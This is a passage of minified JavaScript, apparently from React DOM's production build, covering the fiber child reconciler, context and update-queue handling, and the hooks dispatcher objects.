function os(e, t) {
    throw (
        ((e = Object.prototype.toString.call(t)),
        Error(j(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e)))
    );
}
function Qd(e) {
    var t = e._init;
    return t(e._payload);
}
function Dm(e) {
    function t(g, h) {
        if (e) {
            var v = g.deletions;
            v === null ? ((g.deletions = [h]), (g.flags |= 16)) : v.push(h);
        }
    }
    function n(g, h) {
        if (!e) return null;
        for (; h !== null; ) t(g, h), (h = h.sibling);
        return null;
    }
    function r(g, h) {
        for (g = new Map(); h !== null; ) h.key !== null ? g.set(h.key, h) : g.set(h.index, h), (h = h.sibling);
        return g;
    }
    function o(g, h) {
        return (g = Yn(g, h)), (g.index = 0), (g.sibling = null), g;
    }
    function i(g, h, v) {
        return (
            (g.index = v),
            e
                ? ((v = g.alternate),
                  v !== null ? ((v = v.index), v < h ? ((g.flags |= 2), h) : v) : ((g.flags |= 2), h))
                : ((g.flags |= 1048576), h)
        );
    }
    function s(g) {
        return e && g.alternate === null && (g.flags |= 2), g;
    }
    function a(g, h, v, b) {
        return h === null || h.tag !== 6
            ? ((h = yl(v, g.mode, b)), (h.return = g), h)
            : ((h = o(h, v)), (h.return = g), h);
    }
    function c(g, h, v, b) {
        var k = v.type;
        return k === Hr
            ? d(g, h, v.props.children, b, v.key)
            : h !== null &&
                (h.elementType === k || (typeof k == "object" && k !== null && k.$$typeof === Rn && Qd(k) === h.type))
              ? ((b = o(h, v.props)), (b.ref = Bo(g, h, v)), (b.return = g), b)
              : ((b = As(v.type, v.key, v.props, null, g.mode, b)), (b.ref = Bo(g, h, v)), (b.return = g), b);
    }
    function u(g, h, v, b) {
        return h === null ||
            h.tag !== 4 ||
            h.stateNode.containerInfo !== v.containerInfo ||
            h.stateNode.implementation !== v.implementation
            ? ((h = vl(v, g.mode, b)), (h.return = g), h)
            : ((h = o(h, v.children || [])), (h.return = g), h);
    }
    function d(g, h, v, b, k) {
        return h === null || h.tag !== 7
            ? ((h = Sr(v, g.mode, b, k)), (h.return = g), h)
            : ((h = o(h, v)), (h.return = g), h);
    }
    function p(g, h, v) {
        if ((typeof h == "string" && h !== "") || typeof h == "number")
            return (h = yl("" + h, g.mode, v)), (h.return = g), h;
        if (typeof h == "object" && h !== null) {
            switch (h.$$typeof) {
                case Gi:
                    return (
                        (v = As(h.type, h.key, h.props, null, g.mode, v)), (v.ref = Bo(g, null, h)), (v.return = g), v
                    );
                case Ur:
                    return (h = vl(h, g.mode, v)), (h.return = g), h;
                case Rn:
                    var b = h._init;
                    return p(g, b(h._payload), v);
            }
            if (Go(h) || Do(h)) return (h = Sr(h, g.mode, v, null)), (h.return = g), h;
            os(g, h);
        }
        return null;
    }
    function m(g, h, v, b) {
        var k = h !== null ? h.key : null;
        if ((typeof v == "string" && v !== "") || typeof v == "number") return k !== null ? null : a(g, h, "" + v, b);
        if (typeof v == "object" && v !== null) {
            switch (v.$$typeof) {
                case Gi:
                    return v.key === k ? c(g, h, v, b) : null;
                case Ur:
                    return v.key === k ? u(g, h, v, b) : null;
                case Rn:
                    return (k = v._init), m(g, h, k(v._payload), b);
            }
            if (Go(v) || Do(v)) return k !== null ? null : d(g, h, v, b, null);
            os(g, v);
        }
        return null;
    }
    function f(g, h, v, b, k) {
        if ((typeof b == "string" && b !== "") || typeof b == "number")
            return (g = g.get(v) || null), a(h, g, "" + b, k);
        if (typeof b == "object" && b !== null) {
            switch (b.$$typeof) {
                case Gi:
                    return (g = g.get(b.key === null ? v : b.key) || null), c(h, g, b, k);
                case Ur:
                    return (g = g.get(b.key === null ? v : b.key) || null), u(h, g, b, k);
                case Rn:
                    var C = b._init;
                    return f(g, h, v, C(b._payload), k);
            }
            if (Go(b) || Do(b)) return (g = g.get(v) || null), d(h, g, b, k, null);
            os(h, b);
        }
        return null;
    }
    function S(g, h, v, b) {
        for (var k = null, C = null, P = h, A = (h = 0), L = null; P !== null && A < v.length; A++) {
            P.index > A ? ((L = P), (P = null)) : (L = P.sibling);
            var M = m(g, P, v[A], b);
            if (M === null) {
                P === null && (P = L);
                break;
            }
            e && P && M.alternate === null && t(g, P),
                (h = i(M, h, A)),
                C === null ? (k = M) : (C.sibling = M),
                (C = M),
                (P = L);
        }
        if (A === v.length) return n(g, P), de && cr(g, A), k;
        if (P === null) {
            for (; A < v.length; A++)
                (P = p(g, v[A], b)), P !== null && ((h = i(P, h, A)), C === null ? (k = P) : (C.sibling = P), (C = P));
            return de && cr(g, A), k;
        }
        for (P = r(g, P); A < v.length; A++)
            (L = f(P, g, A, v[A], b)),
                L !== null &&
                    (e && L.alternate !== null && P.delete(L.key === null ? A : L.key),
                    (h = i(L, h, A)),
                    C === null ? (k = L) : (C.sibling = L),
                    (C = L));
        return (
            e &&
                P.forEach(function (U) {
                    return t(g, U);
                }),
            de && cr(g, A),
            k
        );
    }
    function y(g, h, v, b) {
        var k = Do(v);
        if (typeof k != "function") throw Error(j(150));
        if (((v = k.call(v)), v == null)) throw Error(j(151));
        for (var C = (k = null), P = h, A = (h = 0), L = null, M = v.next(); P !== null && !M.done; A++, M = v.next()) {
            P.index > A ? ((L = P), (P = null)) : (L = P.sibling);
            var U = m(g, P, M.value, b);
            if (U === null) {
                P === null && (P = L);
                break;
            }
            e && P && U.alternate === null && t(g, P),
                (h = i(U, h, A)),
                C === null ? (k = U) : (C.sibling = U),
                (C = U),
                (P = L);
        }
        if (M.done) return n(g, P), de && cr(g, A), k;
        if (P === null) {
            for (; !M.done; A++, M = v.next())
                (M = p(g, M.value, b)),
                    M !== null && ((h = i(M, h, A)), C === null ? (k = M) : (C.sibling = M), (C = M));
            return de && cr(g, A), k;
        }
        for (P = r(g, P); !M.done; A++, M = v.next())
            (M = f(P, g, A, M.value, b)),
                M !== null &&
                    (e && M.alternate !== null && P.delete(M.key === null ? A : M.key),
                    (h = i(M, h, A)),
                    C === null ? (k = M) : (C.sibling = M),
                    (C = M));
        return (
            e &&
                P.forEach(function (F) {
                    return t(g, F);
                }),
            de && cr(g, A),
            k
        );
    }
    function w(g, h, v, b) {
        if (
            (typeof v == "object" && v !== null && v.type === Hr && v.key === null && (v = v.props.children),
            typeof v == "object" && v !== null)
        ) {
            switch (v.$$typeof) {
                case Gi:
                    e: {
                        for (var k = v.key, C = h; C !== null; ) {
                            if (C.key === k) {
                                if (((k = v.type), k === Hr)) {
                                    if (C.tag === 7) {
                                        n(g, C.sibling), (h = o(C, v.props.children)), (h.return = g), (g = h);
                                        break e;
                                    }
                                } else if (
                                    C.elementType === k ||
                                    (typeof k == "object" && k !== null && k.$$typeof === Rn && Qd(k) === C.type)
                                ) {
                                    n(g, C.sibling),
                                        (h = o(C, v.props)),
                                        (h.ref = Bo(g, C, v)),
                                        (h.return = g),
                                        (g = h);
                                    break e;
                                }
                                n(g, C);
                                break;
                            } else t(g, C);
                            C = C.sibling;
                        }
                        v.type === Hr
                            ? ((h = Sr(v.props.children, g.mode, b, v.key)), (h.return = g), (g = h))
                            : ((b = As(v.type, v.key, v.props, null, g.mode, b)),
                              (b.ref = Bo(g, h, v)),
                              (b.return = g),
                              (g = b));
                    }
                    return s(g);
                case Ur:
                    e: {
                        for (C = v.key; h !== null; ) {
                            if (h.key === C)
                                if (
                                    h.tag === 4 &&
                                    h.stateNode.containerInfo === v.containerInfo &&
                                    h.stateNode.implementation === v.implementation
                                ) {
                                    n(g, h.sibling), (h = o(h, v.children || [])), (h.return = g), (g = h);
                                    break e;
                                } else {
                                    n(g, h);
                                    break;
                                }
                            else t(g, h);
                            h = h.sibling;
                        }
                        (h = vl(v, g.mode, b)), (h.return = g), (g = h);
                    }
                    return s(g);
                case Rn:
                    return (C = v._init), w(g, h, C(v._payload), b);
            }
            if (Go(v)) return S(g, h, v, b);
            if (Do(v)) return y(g, h, v, b);
            os(g, v);
        }
        return (typeof v == "string" && v !== "") || typeof v == "number"
            ? ((v = "" + v),
              h !== null && h.tag === 6
                  ? (n(g, h.sibling), (h = o(h, v)), (h.return = g), (g = h))
                  : (n(g, h), (h = yl(v, g.mode, b)), (h.return = g), (g = h)),
              s(g))
            : n(g, h);
    }
    return w;
}
var wo = Dm(!0),
    Om = Dm(!1),
    Ks = sr(null),
    Gs = null,
    Xr = null,
    fu = null;
function mu() {
    fu = Xr = Gs = null;
}
function hu(e) {
    var t = Ks.current;
    ce(Ks), (e._currentValue = t);
}
function sc(e, t, n) {
    for (; e !== null; ) {
        var r = e.alternate;
        if (
            ((e.childLanes & t) !== t
                ? ((e.childLanes |= t), r !== null && (r.childLanes |= t))
                : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
            e === n)
        )
            break;
        e = e.return;
    }
}
function oo(e, t) {
    (Gs = e),
        (fu = Xr = null),
        (e = e.dependencies),
        e !== null && e.firstContext !== null && (e.lanes & t && (Xe = !0), (e.firstContext = null));
}
function yt(e) {
    var t = e._currentValue;
    if (fu !== e)
        if (((e = { context: e, memoizedValue: t, next: null }), Xr === null)) {
            if (Gs === null) throw Error(j(308));
            (Xr = e), (Gs.dependencies = { lanes: 0, firstContext: e });
        } else Xr = Xr.next = e;
    return t;
}
var pr = null;
function gu(e) {
    pr === null ? (pr = [e]) : pr.push(e);
}
function _m(e, t, n, r) {
    var o = t.interleaved;
    return o === null ? ((n.next = n), gu(t)) : ((n.next = o.next), (o.next = n)), (t.interleaved = n), gn(e, r);
}
function gn(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null; )
        (e.childLanes |= t), (n = e.alternate), n !== null && (n.childLanes |= t), (n = e), (e = e.return);
    return n.tag === 3 ? n.stateNode : null;
}
var Mn = !1;
function yu(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: { pending: null, interleaved: null, lanes: 0 },
        effects: null,
    };
}
function Fm(e, t) {
    (e = e.updateQueue),
        t.updateQueue === e &&
            (t.updateQueue = {
                baseState: e.baseState,
                firstBaseUpdate: e.firstBaseUpdate,
                lastBaseUpdate: e.lastBaseUpdate,
                shared: e.shared,
                effects: e.effects,
            });
}
function pn(e, t) {
    return { eventTime: e, lane: t, tag: 0, payload: null, callback: null, next: null };
}
function Qn(e, t, n) {
    var r = e.updateQueue;
    if (r === null) return null;
    if (((r = r.shared), ee & 2)) {
        var o = r.pending;
        return o === null ? (t.next = t) : ((t.next = o.next), (o.next = t)), (r.pending = t), gn(e, n);
    }
    return (
        (o = r.interleaved),
        o === null ? ((t.next = t), gu(r)) : ((t.next = o.next), (o.next = t)),
        (r.interleaved = t),
        gn(e, n)
    );
}
function ks(e, t, n) {
    if (((t = t.updateQueue), t !== null && ((t = t.shared), (n & 4194240) !== 0))) {
        var r = t.lanes;
        (r &= e.pendingLanes), (n |= r), (t.lanes = n), nu(e, n);
    }
}
function qd(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (r !== null && ((r = r.updateQueue), n === r)) {
        var o = null,
            i = null;
        if (((n = n.firstBaseUpdate), n !== null)) {
            do {
                var s = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null,
                };
                i === null ? (o = i = s) : (i = i.next = s), (n = n.next);
            } while (n !== null);
            i === null ? (o = i = t) : (i = i.next = t);
        } else o = i = t;
        (n = { baseState: r.baseState, firstBaseUpdate: o, lastBaseUpdate: i, shared: r.shared, effects: r.effects }),
            (e.updateQueue = n);
        return;
    }
    (e = n.lastBaseUpdate), e === null ? (n.firstBaseUpdate = t) : (e.next = t), (n.lastBaseUpdate = t);
}
function Qs(e, t, n, r) {
    var o = e.updateQueue;
    Mn = !1;
    var i = o.firstBaseUpdate,
        s = o.lastBaseUpdate,
        a = o.shared.pending;
    if (a !== null) {
        o.shared.pending = null;
        var c = a,
            u = c.next;
        (c.next = null), s === null ? (i = u) : (s.next = u), (s = c);
        var d = e.alternate;
        d !== null &&
            ((d = d.updateQueue),
            (a = d.lastBaseUpdate),
            a !== s && (a === null ? (d.firstBaseUpdate = u) : (a.next = u), (d.lastBaseUpdate = c)));
    }
    if (i !== null) {
        var p = o.baseState;
        (s = 0), (d = u = c = null), (a = i);
        do {
            var m = a.lane,
                f = a.eventTime;
            if ((r & m) === m) {
                d !== null &&
                    (d = d.next =
                        { eventTime: f, lane: 0, tag: a.tag, payload: a.payload, callback: a.callback, next: null });
                e: {
                    var S = e,
                        y = a;
                    switch (((m = t), (f = n), y.tag)) {
                        case 1:
                            if (((S = y.payload), typeof S == "function")) {
                                p = S.call(f, p, m);
                                break e;
                            }
                            p = S;
                            break e;
                        case 3:
                            S.flags = (S.flags & -65537) | 128;
                        case 0:
                            if (((S = y.payload), (m = typeof S == "function" ? S.call(f, p, m) : S), m == null))
                                break e;
                            p = me({}, p, m);
                            break e;
                        case 2:
                            Mn = !0;
                    }
                }
                a.callback !== null &&
                    a.lane !== 0 &&
                    ((e.flags |= 64), (m = o.effects), m === null ? (o.effects = [a]) : m.push(a));
            } else
                (f = { eventTime: f, lane: m, tag: a.tag, payload: a.payload, callback: a.callback, next: null }),
                    d === null ? ((u = d = f), (c = p)) : (d = d.next = f),
                    (s |= m);
            if (((a = a.next), a === null)) {
                if (((a = o.shared.pending), a === null)) break;
                (m = a), (a = m.next), (m.next = null), (o.lastBaseUpdate = m), (o.shared.pending = null);
            }
        } while (!0);
        if (
            (d === null && (c = p),
            (o.baseState = c),
            (o.firstBaseUpdate = u),
            (o.lastBaseUpdate = d),
            (t = o.shared.interleaved),
            t !== null)
        ) {
            o = t;
            do (s |= o.lane), (o = o.next);
            while (o !== t);
        } else i === null && (o.shared.lanes = 0);
        (Er |= s), (e.lanes = s), (e.memoizedState = p);
    }
}
function Xd(e, t, n) {
    if (((e = t.effects), (t.effects = null), e !== null))
        for (t = 0; t < e.length; t++) {
            var r = e[t],
                o = r.callback;
            if (o !== null) {
                if (((r.callback = null), (r = n), typeof o != "function")) throw Error(j(191, o));
                o.call(r);
            }
        }
}
var Oi = {},
    Qt = sr(Oi),
    vi = sr(Oi),
    xi = sr(Oi);
function fr(e) {
    if (e === Oi) throw Error(j(174));
    return e;
}
function vu(e, t) {
    switch ((se(xi, t), se(vi, e), se(Qt, Oi), (e = t.nodeType), e)) {
        case 9:
        case 11:
            t = (t = t.documentElement) ? t.namespaceURI : Bl(null, "");
            break;
        default:
            (e = e === 8 ? t.parentNode : t), (t = e.namespaceURI || null), (e = e.tagName), (t = Bl(t, e));
    }
    ce(Qt), se(Qt, t);
}
function So() {
    ce(Qt), ce(vi), ce(xi);
}
function zm(e) {
    fr(xi.current);
    var t = fr(Qt.current),
        n = Bl(t, e.type);
    t !== n && (se(vi, e), se(Qt, n));
}
function xu(e) {
    vi.current === e && (ce(Qt), ce(vi));
}
var pe = sr(0);
function qs(e) {
    for (var t = e; t !== null; ) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && ((n = n.dehydrated), n === null || n.data === "$?" || n.data === "$!")) return t;
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128) return t;
        } else if (t.child !== null) {
            (t.child.return = t), (t = t.child);
            continue;
        }
        if (t === e) break;
        for (; t.sibling === null; ) {
            if (t.return === null || t.return === e) return null;
            t = t.return;
        }
        (t.sibling.return = t.return), (t = t.sibling);
    }
    return null;
}
var dl = [];
function wu() {
    for (var e = 0; e < dl.length; e++) dl[e]._workInProgressVersionPrimary = null;
    dl.length = 0;
}
var Cs = wn.ReactCurrentDispatcher,
    pl = wn.ReactCurrentBatchConfig,
    Pr = 0,
    fe = null,
    Ce = null,
    Te = null,
    Xs = !1,
    ti = !1,
    wi = 0,
    T1 = 0;
function Oe() {
    throw Error(j(321));
}
function Su(e, t) {
    if (t === null) return !1;
    for (var n = 0; n < t.length && n < e.length; n++) if (!Mt(e[n], t[n])) return !1;
    return !0;
}
function bu(e, t, n, r, o, i) {
    if (
        ((Pr = i),
        (fe = t),
        (t.memoizedState = null),
        (t.updateQueue = null),
        (t.lanes = 0),
        (Cs.current = e === null || e.memoizedState === null ? M1 : I1),
        (e = n(r, o)),
        ti)
    ) {
        i = 0;
        do {
            if (((ti = !1), (wi = 0), 25 <= i)) throw Error(j(301));
            (i += 1), (Te = Ce = null), (t.updateQueue = null), (Cs.current = L1), (e = n(r, o));
        } while (ti);
    }
    if (((Cs.current = Ys), (t = Ce !== null && Ce.next !== null), (Pr = 0), (Te = Ce = fe = null), (Xs = !1), t))
        throw Error(j(300));
    return e;
}
function ku() {
    var e = wi !== 0;
    return (wi = 0), e;
}
function Ut() {
    var e = { memoizedState: null, baseState: null, baseQueue: null, queue: null, next: null };
    return Te === null ? (fe.memoizedState = Te = e) : (Te = Te.next = e), Te;
}
function vt() {
    if (Ce === null) {
        var e = fe.alternate;
        e = e !== null ? e.memoizedState : null;
    } else e = Ce.next;
    var t = Te === null ? fe.memoizedState : Te.next;
    if (t !== null) (Te = t), (Ce = e);
    else {
        if (e === null) throw Error(j(310));
        (Ce = e),
            (e = {
                memoizedState: Ce.memoizedState,
                baseState: Ce.baseState,
                baseQueue: Ce.baseQueue,
                queue: Ce.queue,
                next: null,
            }),
            Te === null ? (fe.memoizedState = Te = e) : (Te = Te.next = e);
    }
    return Te;
}
function Si(e, t) {
    return typeof t == "function" ? t(e) : t;
}
function fl(e) {
    var t = vt(),
        n = t.queue;
    if (n === null) throw Error(j(311));
    n.lastRenderedReducer = e;
    var r = Ce,
        o = r.baseQueue,
        i = n.pending;
    if (i !== null) {
        if (o !== null) {
            var s = o.next;
            (o.next = i.next), (i.next = s);
        }
        (r.baseQueue = o = i), (n.pending = null);
    }
    if (o !== null) {
        (i = o.next), (r = r.baseState);
        var a = (s = null),
            c = null,
            u = i;
        do {
            var d = u.lane;
            if ((Pr & d) === d)
                c !== null &&
                    (c = c.next =
                        {
                            lane: 0,
                            action: u.action,
                            hasEagerState: u.hasEagerState,
                            eagerState: u.eagerState,
                            next: null,
                        }),
                    (r = u.hasEagerState ? u.eagerState : e(r, u.action));
            else {
                var p = {
                    lane: d,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null,
                };
                c === null ? ((a = c = p), (s = r)) : (c = c.next = p), (fe.lanes |= d), (Er |= d);
            }
            u = u.next;
        } while (u !== null && u !== i);
        c === null ? (s = r) : (c.next = a),
            Mt(r, t.memoizedState) || (Xe = !0),
            (t.memoizedState = r),
            (t.baseState = s),
            (t.baseQueue = c),
            (n.lastRenderedState = r);
    }
    if (((e = n.interleaved), e !== null)) {
        o = e;
        do (i = o.lane), (fe.lanes |= i), (Er |= i), (o = o.next);
        while (o !== e);
    } else o === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch];
}
function ml(e) {
    var t = vt(),
        n = t.queue;
    if (n === null) throw Error(j(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch,
        o = n.pending,
        i = t.memoizedState;
    if (o !== null) {
        n.pending = null;
        var s = (o = o.next);
        do (i = e(i, s.action)), (s = s.next);
        while (s !== o);
        Mt(i, t.memoizedState) || (Xe = !0),
            (t.memoizedState = i),
            t.baseQueue === null && (t.baseState = i),
            (n.lastRenderedState = i);
    }
    return [i, r];
}
function Bm() {}
function Um(e, t) {
    var n = fe,
        r = vt(),
        o = t(),
        i = !Mt(r.memoizedState, o);
    if (
        (i && ((r.memoizedState = o), (Xe = !0)),
        (r = r.queue),
        Cu(Vm.bind(null, n, r, e), [e]),
        r.getSnapshot !== t || i || (Te !== null && Te.memoizedState.tag & 1))
    ) {
        if (((n.flags |= 2048), bi(9, $m.bind(null, n, r, o, t), void 0, null), Ae === null)) throw Error(j(349));
        Pr & 30 || Hm(n, t, o);
    }
    return o;
}
function Hm(e, t, n) {
    (e.flags |= 16384),
        (e = { getSnapshot: t, value: n }),
        (t = fe.updateQueue),
        t === null
            ? ((t = { lastEffect: null, stores: null }), (fe.updateQueue = t), (t.stores = [e]))
            : ((n = t.stores), n === null ? (t.stores = [e]) : n.push(e));
}
function $m(e, t, n, r) {
    (t.value = n), (t.getSnapshot = r), Wm(t) && Km(e);
}
function Vm(e, t, n) {
    return n(function () {
        Wm(t) && Km(e);
    });
}
function Wm(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !Mt(e, n);
    } catch {
        return !0;
    }
}
function Km(e) {
    var t = gn(e, 1);
    t !== null && Rt(t, e, 1, -1);
}
function Yd(e) {
    var t = Ut();
    return (
        typeof e == "function" && (e = e()),
        (t.memoizedState = t.baseState = e),
        (e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: Si,
            lastRenderedState: e,
        }),
        (t.queue = e),
        (e = e.dispatch = R1.bind(null, fe, e)),
        [t.memoizedState, e]
    );
}
function bi(e, t, n, r) {
    return (
        (e = { tag: e, create: t, destroy: n, deps: r, next: null }),
        (t = fe.updateQueue),
        t === null
            ? ((t = { lastEffect: null, stores: null }), (fe.updateQueue = t), (t.lastEffect = e.next = e))
            : ((n = t.lastEffect),
              n === null
                  ? (t.lastEffect = e.next = e)
                  : ((r = n.next), (n.next = e), (e.next = r), (t.lastEffect = e))),
        e
    );
}
function Gm() {
    return vt().memoizedState;
}
function Ps(e, t, n, r) {
    var o = Ut();
    (fe.flags |= e), (o.memoizedState = bi(1 | t, n, void 0, r === void 0 ? null : r));
}
function ka(e, t, n, r) {
    var o = vt();
    r = r === void 0 ? null : r;
    var i = void 0;
    if (Ce !== null) {
        var s = Ce.memoizedState;
        if (((i = s.destroy), r !== null && Su(r, s.deps))) {
            o.memoizedState = bi(t, n, i, r);
            return;
        }
    }
    (fe.flags |= e), (o.memoizedState = bi(1 | t, n, i, r));
}
function Zd(e, t) {
    return Ps(8390656, 8, e, t);
}
function Cu(e, t) {
    return ka(2048, 8, e, t);
}
function Qm(e, t) {
    return ka(4, 2, e, t);
}
function qm(e, t) {
    return ka(4, 4, e, t);
}
function Xm(e, t) {
    if (typeof t == "function")
        return (
            (e = e()),
            t(e),
            function () {
                t(null);
            }
        );
    if (t != null)
        return (
            (e = e()),
            (t.current = e),
            function () {
                t.current = null;
            }
        );
}
function Ym(e, t, n) {
    return (n = n != null ? n.concat([e]) : null), ka(4, 4, Xm.bind(null, t, e), n);
}
function Pu() {}
function Zm(e, t) {
    var n = vt();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Su(t, r[1]) ? r[0] : ((n.memoizedState = [e, t]), e);
}
function Jm(e, t) {
    var n = vt();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Su(t, r[1]) ? r[0] : ((e = e()), (n.memoizedState = [e, t]), e);
}
function eh(e, t, n) {
    return Pr & 21
        ? (Mt(n, t) || ((n = im()), (fe.lanes |= n), (Er |= n), (e.baseState = !0)), t)
        : (e.baseState && ((e.baseState = !1), (Xe = !0)), (e.memoizedState = n));
}
function A1(e, t) {
    var n = oe;
    (oe = n !== 0 && 4 > n ? n : 4), e(!0);
    var r = pl.transition;
    pl.transition = {};
    try {
        e(!1), t();
    } finally {
        (oe = n), (pl.transition = r);
    }
}
function th() {
    return vt().memoizedState;
}
function j1(e, t, n) {
    var r = Xn(e);
    if (((n = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null }), nh(e))) rh(t, n);
    else if (((n = _m(e, t, n, r)), n !== null)) {
        var o = We();
        Rt(n, e, r, o), oh(n, t, r);
    }
}
function R1(e, t, n) {
    var r = Xn(e),
        o = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null };
    if (nh(e)) rh(t, o);
    else {
        var i = e.alternate;
        if (e.lanes === 0 && (i === null || i.lanes === 0) && ((i = t.lastRenderedReducer), i !== null))
            try {
                var s = t.lastRenderedState,
                    a = i(s, n);
                if (((o.hasEagerState = !0), (o.eagerState = a), Mt(a, s))) {
                    var c = t.interleaved;
                    c === null ? ((o.next = o), gu(t)) : ((o.next = c.next), (c.next = o)), (t.interleaved = o);
                    return;
                }
            } catch {
            } finally {
            }
        (n = _m(e, t, o, r)), n !== null && ((o = We()), Rt(n, e, r, o), oh(n, t, r));
    }
}
function nh(e) {
    var t = e.alternate;
    return e === fe || (t !== null && t === fe);
}
function rh(e, t) {
    ti = Xs = !0;
    var n = e.pending;
    n === null ? (t.next = t) : ((t.next = n.next), (n.next = t)), (e.pending = t);
}
function oh(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        (r &= e.pendingLanes), (n |= r), (t.lanes = n), nu(e, n);
    }
}
var Ys = {
        readContext: yt,
        useCallback: Oe,
        useContext: Oe,
        useEffect: Oe,
        useImperativeHandle: Oe,
        useInsertionEffect: Oe,
        useLayoutEffect: Oe,
        useMemo: Oe,
        useReducer: Oe,
        useRef: Oe,
        useState: Oe,
        useDebugValue: Oe,
        useDeferredValue: Oe,
        useTransition: Oe,
        useMutableSource: Oe,
        useSyncExternalStore: Oe,
        useId: Oe,
        unstable_isNewReconciler: !1,
    },
    M1 = {
        readContext: yt,
        useCallback: function (e, t) {
            return (Ut().memoizedState = [e, t === void 0 ? null : t]), e;
        },
        useContext: yt,
        useEffect: Zd,
        useImperativeHandle: function (e, t, n) {
            return (n = n != null ? n.concat([e]) : null), Ps(4194308, 4, Xm.bind(null, t, e), n);
        },
        useLayoutEffect: function (e, t) {
            return Ps(4194308, 4, e, t);
        },
        useInsertionEffect: function (e, t) {
            return Ps(4, 2, e, t);
        },
        useMemo: function (e, t) {
            var n = Ut();
            return (t = t === void 0 ? null : t), (e = e()), (n.memoizedState = [e, t]), e;
        },
        useReducer: function (e, t, n) {
            var r = Ut();
            return (
                (t = n !== void 0 ? n(t) : t),
                (r.memoizedState = r.baseState = t),
                (e = {
                    pending: null,
                    interleaved: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: e,
                    lastRenderedState: t,
                }),
                (r.queue = e),
                (e = e.dispatch = j1.bind(null, fe, e)),
                [r.memoizedState, e]
            );
        },
        useRef: function (e) {
            var t = Ut();
            return (e = { current: e }), (t.memoizedState = e);
        },
        useState: Yd,
        useDebugValue: Pu,
        useDeferredValue: function (e) {
            return (Ut().memoizedState = e);
        },
        useTransition: function () {
            var e = Yd(!1),
                t = e[0];
            return (e = A1.bind(null, e[1])), (Ut().memoizedState = e), [t, e];
        },
        useMutableSource: function () {},
        useSyncExternalStore: function (e, t, n) {
            var r = fe,
                o = Ut();
            if (de) {
                if (n === void 0) throw Error(j(407));
                n = n();
            } else {
                if (((n = t()), Ae === null)) throw Error(j(349));
                Pr & 30 || Hm(r, t, n);
            }
            o.memoizedState = n;
            var i = { value: n, getSnapshot: t };
            return (
                (o.queue = i),
                Zd(Vm.bind(null, r, i, e), [e]),
                (r.flags |= 2048),
                bi(9, $m.bind(null, r, i, n, t), void 0, null),
                n
            );
        },
        useId: function () {
            var e = Ut(),
                t = Ae.identifierPrefix;
            if (de) {
                var n = dn,
                    r = un;
                (n = (r & ~(1 << (32 - jt(r) - 1))).toString(32) + n),
                    (t = ":" + t + "R" + n),
                    (n = wi++),
                    0 < n && (t += "H" + n.toString(32)),
                    (t += ":");
            } else (n = T1++), (t = ":" + t + "r" + n.toString(32) + ":");
            return (e.memoizedState = t);
        },
        unstable_isNewReconciler: !1,
    },
    I1 = {
        readContext: yt,
        useCallback: Zm,
        useContext: yt,
        useEffect: Cu,
        useImperativeHandle: Ym,
        useInsertionEffect: Qm,
        useLayoutEffect: qm,
        useMemo: Jm,
        useReducer: fl,
        useRef: Gm,
        useState: function () {
            return fl(Si);
        },
        useDebugValue: Pu,
        useDeferredValue: function (e) {
            var t = vt();
            return eh(t, Ce.memoizedState, e);
        },
        useTransition: function () {
            var e = fl(Si)[0],
                t = vt().memoizedState;
            return [e, t];
        },
        useMutableSource: Bm,
        useSyncExternalStore: Um,
        useId: th,
        unstable_isNewReconciler: !1,
    },
    L1 = {
        readContext: yt,
        useCallback: Zm,
        useContext: yt,
        useEffect: Cu,
        useImperativeHandle: Ym,
        useInsertionEffect: Qm,
        useLayoutEffect: qm,
        useMemo: Jm,
        useReducer: ml,
        useRef: Gm,
        useState: function () {
            return ml(Si);
        },
        useDebugValue: Pu,
        useDeferredValue: function (e) {
            var t = vt();
            return Ce === null ? (t.memoizedState = e) : eh(t, Ce.memoizedState, e);
        },
        useTransition: function () {
            var e = ml(Si)[0],
                t = vt().memoizedState;
            return [e, t];
        },
        useMutableSource: Bm,
        useSyncExternalStore: Um,
        useId: th,
        unstable_isNewReconciler: !1,
    };
function Ct(e, t) {
    if (e && e.defaultProps) {
        (t = me({}, t)), (e = e.defaultProps);
        for (var n in e) t[n] === void 0 && (t[n] = e[n]);
        return t;
    }
    return t;
}
function ac(e, t, n, r) {
    (t = e.memoizedState),
        (n = n(r, t)),
        (n = n == null ? t : me({}, t, n)),
        (e.memoizedState = n),
        e.lanes === 0 && (e.updateQueue.baseState = n);
}
var Ca = {
    isMounted: function (e) {
        return (e = e._reactInternals) ? Mr(e) === e : !1;
    },
    enqueueSetState: function (e, t, n) {
        e = e._reactInternals;
        var r = We(),
            o = Xn(e),
            i = pn(r, o);
        (i.payload = t), n != null && (i.callback = n), (t = Qn(e, i, o)), t !== null && (Rt(t, e, o, r), ks(t, e, o));
    },
    enqueueReplaceState: function (e, t, n) {
        e = e._reactInternals;
        var r = We(),
            o = Xn(e),
            i = pn(r, o);
        (i.tag = 1),
            (i.payload = t),
            n != null && (i.callback = n),
            (t = Qn(e, i, o)),
            t !== null && (Rt(t, e, o, r), ks(t, e, o));
    },
    enqueueForceUpdate: function (e, t) {
        e = e._reactInternals;
        var n = We(),
            r = Xn(e),
            o = pn(n, r);
